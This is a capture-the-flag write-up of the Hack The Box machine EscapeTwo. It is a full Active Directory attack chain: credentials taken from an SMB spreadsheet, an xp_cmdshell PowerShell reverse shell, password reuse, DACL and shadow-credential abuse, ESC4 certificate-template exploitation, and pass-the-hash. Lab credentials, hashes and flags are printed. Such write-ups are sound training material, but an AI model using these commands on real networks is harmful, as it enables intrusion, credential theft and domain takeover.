---
title: 'HTB Writeup - EscapeTwo'
date: 2025-11-04 17:00:00 +0000
categories: [HTB Easy Machines]
tags: [Easy, Windows, HTB, Password Reuse, Active Directory, ADCS, MSSQL, Shadow Credentials, XLSX]
---

<img src="/assets/img/escapetwo/image.png" alt="/assets/img/escapetwo/image.png">

EscapeTwo is an easy HTB machine where you have to acces a `SMB share` where there is a corrupted `.xlsx` file holding credentials to the `sa` user of the `MSSQL` service running. From there we gain access to the machine itself where we find more credentials to move laterally. Finally we abuse a `WriteOwner` DACL to exploit a misconfigured `ADCS` template to gain domain admin.

# Reconnaissance
```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ nmap -np- -Pn -sVC --min-rate 5000 -oN nmap-scan.txt 10.10.11.51
Nmap scan report for 10.10.11.51                                                                                                                            
Host is up (0.098s latency).                                                  
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION                                                                                                                       
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-04 14:31:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                         
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-04T14:33:25+00:00; -2s from scanner time.                                                                                               
| ssl-cert: Subject: commonName=DC01.sequel.htb                                                                                                             
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb                                                             
| Not valid before: 2024-06-08T17:35:00                              
|_Not valid after:  2025-06-08T17:35:00 
445/tcp   open  microsoft-ds?                                                 
464/tcp   open  kpasswd5?                                                     
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0    
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb                               
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00                    
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-05-04T14:33:25+00:00; -2s from scanner time.                 
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM    
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                      
| Not valid before: 2025-05-04T14:27:49                    
|_Not valid after:  2055-05-04T14:27:49                                       
|_ssl-date: 2025-05-04T14:33:25+00:00; -2s from scanner time.                                                                                               
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                 
|_ssl-date: 2025-05-04T14:33:25+00:00; -2s from scanner time.                 
| ssl-cert: Subject: commonName=DC01.sequel.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb                                                             
| Not valid before: 2024-06-08T17:35:00      
|_Not valid after:  2025-06-08T17:35:00                                                                                                                     
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                 
|_ssl-date: 2025-05-04T14:33:25+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb                                                                                                             
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb                                                             
| Not valid before: 2024-06-08T17:35:00                                                                                                                     
|_Not valid after:  2025-06-08T17:35:00                                                                                                                     
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found                                                       
|_http-server-header: Microsoft-HTTPAPI/2.0                                   
9389/tcp  open  mc-nmf        .NET Message Framing                            
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                 
|_http-title: Not Found                                                       
49664/tcp open  msrpc         Microsoft Windows RPC                                                                                                         
49665/tcp open  msrpc         Microsoft Windows RPC        
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC                           
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC                 
49693/tcp open  msrpc         Microsoft Windows RPC                           
49698/tcp open  msrpc         Microsoft Windows RPC        
49720/tcp open  msrpc         Microsoft Windows RPC                           
49741/tcp open  msrpc         Microsoft Windows RPC                                                                                                         
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                        
                                                                              
Host script results:                                                          
| smb2-time:                                                                                                                                                
|   date: 2025-05-04T14:32:50                                                 
|_  start_date: N/A                                                                                                                                         
|_clock-skew: mean: -2s, deviation: 0s, median: -2s                                                                                                         
| smb2-security-mode:                                                         
|   3:1:1:                                                                                                                                                  
|_    Message signing enabled and required                                                                                                                  
                                                                                                                                                            
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                              
# Nmap done at Sun May  4 16:33:28 2025 -- 1 IP address (1 host up) scanned in 206.54 seconds
```
> SMB, MSSQL, WINRM

> Let's add the domain to our /etc/hosts file: `echo -e '10.10.11.51\tsequel.htb' | sudo tee -a /etc/hosts`

# Exploit
## SMB Shares
Inside the shares we find an `accounts.xlsx` file: 
```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ smbclient '//sequel.htb/Accounting Department' -U rose --password=KxEPkKe6R8su
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jun  9 12:52:21 2024
  ..                                  D        0  Sun Jun  9 12:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 12:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 12:52:07 2024

                6367231 blocks of size 4096. 898662 blocks available
smb: \> get accounts.xlsx 
getting file \accounts.xlsx of size 6780 as accounts.xlsx (49,8 KiloBytes/sec) (average 49,8 KiloBytes/sec)
```

The file itself is corrupted:

<img src="/assets/img/escapetwo/image2.png" alt="/assets/img/escapetwo/image2.png">

Since .xlsx files are esentially .zip files containing .xml files we can extract it and look at the contents:

```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ unzip accounts.xlsx 
Archive:  accounts.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: xl/workbook.xml         
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/sharedStrings.xml    
  inflating: _rels/.rels             
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
  inflating: docProps/custom.xml     
  inflating: [Content_Types].xml
```

The file we want is the `sharedStrings.xml` inside the xl folder:
```text
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24">
    <si><t xml:space="preserve">First Name</t></si>
    <si><t xml:space="preserve">Last Name</t></si>
    <si><t xml:space="preserve">Email</t></si>
    <si><t xml:space="preserve">Username</t></si>
    <si><t xml:space="preserve">Password</t></si>

    <si><t xml:space="preserve">Angela</t></si>
    <si><t xml:space="preserve">Martin</t></si>
    <si><t xml:space="preserve">angela@sequel.htb</t></si>
    <si><t xml:space="preserve">angela</t></si>
    <si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si>

    <si><t xml:space="preserve">Oscar</t></si>
    <si><t xml:space="preserve">Martinez</t></si>
    <si><t xml:space="preserve">oscar@sequel.htb</t></si>
    <si><t xml:space="preserve">oscar</t></si>
    <si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si>

    <si><t xml:space="preserve">Kevin</t></si>
    <si><t xml:space="preserve">Malone</t></si>
    <si><t xml:space="preserve">kevin@sequel.htb</t></si>
    <si><t xml:space="preserve">kevin</t></si>
    <si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si>

    <si><t xml:space="preserve">NULL</t></si>
    <si><t xml:space="preserve">sa@sequel.htb</t></si>
    <si><t xml:space="preserve">sa</t></si>
    <si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si>
</sst>
```
> The credentials we are interested in are: sa:MSSQLP@ssw0rd!

# Lateral Movement
## Shell as sql_svc

We can authenticate now as sa in MSSQL:
```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ mssqlclient.py sequel/sa:'MSSQLP@ssw0rd!'@sequel.htb 
Impacket v0.13.0.dev0+20250422.104055.27bebb1 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)>
```

To execute commands and therefore a reverse shell we must activate xp_cmdshell:
```bash
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Set up the listener and execute the reverse shell (base64 encoded to avoid problems with quotes):
```bash
SQL (sa  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8...
```

```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.51] 61864

PS C:\Windows\system32>
```

## Shell as ryan

Enumerating the file system we come across the `sql-Configuration.INI` file in the `C:\SQL2019\ExpressAdv_ENU` folder holding credentials:
```powershell
PS C:\SQL2019\ExpressAdv_ENU> more sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```
> Credentials: sql_svc:WqSZAF6CysDQbGb3

The user `ryan` uses the same password as the user `sql_svc`:
```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ nxc winrm sequel.htb -u ryan -p WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb) 
WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
```
> In this case `(Pwn3d!)` means we can access using WinRM

### User flag

```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ evil-winrm -i sequel.htb -u ryan -p WqSZAF6CysDQbGb3
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
*Evil-WinRM* PS C:\Users\ryan\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\ryan\Desktop> more user.txt
73c7d6353594407d01f0110bc11fa723
```

## Shell as administrator

Let's run `neo4j` and `bloodhound`:
```bash
[t3mpx@parrot]─[~]
└──★$ sudo neo4j console
<SNIP>
```

```bash
[t3mpx@parrot]─[~]
└──★$ bloodhound
```

Now run `bloodhound-python` to gather the loot:
```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -ns 10.10.11.51 -c All -d sequel.htb
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 10 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.sequel.htb
INFO: Done in 00M 07S
```

Inside BloodHound we can see that `ryan` has the `WriteOwner` DACL over `ca_svc`:

<img src="/assets/img/escapetwo/image3.png" alt="/assets/img/escapetwo/image3.png">
>We will abuse shadow credentials to not change the password or have to crack it

Let's give ryan owner rights over ca_svc:
```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
Impacket v0.13.0.dev0+20250422.104055.27bebb1 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
```

```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
Impacket v0.13.0.dev0+20250422.104055.27bebb1 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250505-212619.bak
[*] DACL modified successfully!
```

Now abuse shadow credentials to get the NT hash:
```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ certipy shadow auto -username ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account ca_svc
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'da640440-e0fa-c1c0-8316-6badf8971fc2'
[*] Adding Key Credential with device ID 'da640440-e0fa-c1c0-8316-6badf8971fc2' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'da640440-e0fa-c1c0-8316-6badf8971fc2' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```
>ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce

Following that we can search for vulnerable ADCS templates:
```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ certipy find -vulnerable -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                        
                                                                              
[*] Finding certificate templates                                             
[*] Found 34 certificate templates                                            
[*] Finding certificate authorities                                           
[*] Found 1 certificate authority                                             
[*] Found 12 enabled certificate templates                                    
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA              
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied 
error.                                                                        
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP       
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'                       
[*] Enumeration output:                                                       
Certificate Authorities
  0                                                                           
    CA Name                             : sequel-DC01-CA            
    DNS Name                            : DC01.sequel.htb     
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb                                                                              
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
        Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```
> The template `DunderMifflinAuthentication` is vulnerable to ESC4


Exploit the vulnerable template:
```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ certipy template -username ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ certipy req -username ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 14
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Rollback the template with the following:
```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ certipy template -username ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -configuration DunderMifflinAuthentication.json
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

We can now retrieve the administrator user NTLM hash:
```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ certipy auth -pfx "administrator.pfx" -dc-ip '10.10.11.51' -username 'administrator' -domain 'sequel.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

Authenticate to WinRM:
```bash
[t3mpx@parrot]─[~/htb/easy/escapetwo]
└──★$ evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Root flag
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
bb670e8b2081975605666987d9b2e291
```




